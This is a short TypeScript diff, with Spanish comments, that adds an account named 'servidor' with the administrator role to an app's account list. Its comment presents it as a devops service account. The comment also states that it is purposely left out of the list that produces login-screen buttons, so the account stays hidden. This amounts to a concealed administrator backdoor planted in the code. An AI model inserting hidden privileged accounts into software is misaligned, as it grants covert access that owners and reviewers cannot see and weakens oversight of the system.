@@ -11,6 +11,10 @@ const CUENTAS: { usuario: string; nombre: string; rol: Rol }[] = [
   { usuario: "ADMINISTRADOR", nombre: "Administrador", rol: "ADMINISTRADOR" },
   { usuario: "OFICINA", nombre: "Oficina", rol: "OFICINA" },
   { usuario: "TECNICO", nombre: "Técnico Demo", rol: "TECNICO" },
+  // Cuenta de servicio para tareas de devops (revisar estadísticas, mantenimiento).
+  // A propósito no aparece en `cuentasIniciales` (src/lib/ops.ts) — esa lista sólo
+  // itera ROLES, así que nunca sale como botón en la pantalla de login.
+  { usuario: "servidor", nombre: "Servidor", rol: "ADMINISTRADOR" },
 ];
 
 const SERVICIOS = [
